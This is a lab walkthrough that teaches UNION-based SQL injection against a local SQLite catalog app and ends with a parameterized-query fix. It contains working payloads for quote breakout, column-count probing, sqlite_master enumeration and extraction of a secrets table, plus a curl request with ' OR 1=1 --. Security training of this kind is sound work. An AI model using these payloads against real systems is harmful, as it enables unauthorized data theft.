# Practice Walkthrough: UNION-Based SQL Injection & Schema Exfiltration

This walkthrough adheres to the 4-Tier Mission Progression methodology, balancing **60% manual analytical techniques** and **40% command-line tooling**:

---

## Tier 1: Attack Surface Observation (Weight: 15%)

1. **Verify Lab Container Readiness**:
   Open your browser and navigate to the lab target:
   `http://127.0.0.1:8015`

2. **Inspect Normal Application Operations**:
   - Examine the *Central Logistics Hardware Catalog* dashboard.
   - Enter `Server` in the product search box and click **Search**.
   - **Observation**: The table renders matching inventory records (`Rackmount Server 2U`, Category: `Hardware`, Price: `$3499.5`).
   - Notice the table layout projects exactly **3 distinct columns**: `Product Name`, `Category`, and `Price (USD)`.

---

## Tier 2: Endpoint Discovery & Syntax Breakout (Weight: 25%)

1. **Test String Delimiter Breakout**:
   In the search field, input a single apostrophe (`'`):
   ```text
   '
   ```
   Click **Search** and examine the response.

2. **Analyze Database Exception Feedback**:
   The web UI reflects an internal database exception:
   ```text
   Database Error:
   unrecognized token: "'%"
   ```
   *Analysis Takeaway*: The query processor concatenated user input directly into SQLite syntax without escaping. The unpaired quote broke the query string delimiter!

3. **Verify Projected Column Count**:
   Deploy an incremental `UNION SELECT` probe:
   - Input the payload:
     ```text
     ' UNION SELECT 1, 2, 3 --
     ```
   - **Observation**: The catalog table successfully renders an extra row with values `1`, `2`, and `$3.0`. This conclusively proves that the original query returns exactly **3 columns**.

---

## Tier 3: Schema Enumeration & Vault Exfiltration (Weight: 35%)

1. **Enumerate Database Tables (sqlite_master)**:
   Query SQLite's internal metadata catalog to discover database tables:
   ```text
   ' UNION SELECT tbl_name, sql, 0 FROM sqlite_master WHERE type='table' --
   ```
   Click **Search** and inspect the table results:
   - Public table: `products`.
   - Hidden high-value table: `vault_secrets` with schema `(id INTEGER, secret_name TEXT, secret_data TEXT)`.

2. **Exfiltrate Vault Records**:
   Construct the targeted UNION payload to project `secret_name` and `secret_data`:
   ```text
   ' UNION SELECT secret_name, secret_data, 0 FROM vault_secrets --
   ```

3. **Recover the Authorization Key**:
   The catalog table renders the exfiltrated vault record:
   - **Product Name**: `PROJECT_ZITERA_CORE_FLAG`
   - **Category**: Displays the master secret flag formatted as `FLAG: ZITERA{...}`.
   - Copy the recovered flag token from the screen and submit it in the **Challenge** tab.

---

## Tier 4: Defensive Verification & Remediation Hardening (Weight: 25%)

1. **Verify Vulnerability Behavior via cURL**:
   Execute an automated test against the unhardened endpoint using cURL:
   ```bash
   curl -s "http://127.0.0.1:8015/?q=%27+OR+1%3D1+--"
   ```
   *Vulnerable state*: The response body dumps the entire product database.

2. **Refactor to Parameterized Query**:
   In the backend controller (`app.py`), replace raw f-strings with a parameterized prepared statement:
   ```python
   # Secure Implementation: Bind user data separately
   c.execute("SELECT name, category, price FROM products WHERE name LIKE ?", (f"%{query}%",))
   ```

3. **Confirm Definitive Remediation**:
   Re-test with payload `'` or `' OR 1=1 --`. The database engine treats delimiters strictly as inert string literals, returning clean zero-match messages:
   *"No inventory items found matching your query."*
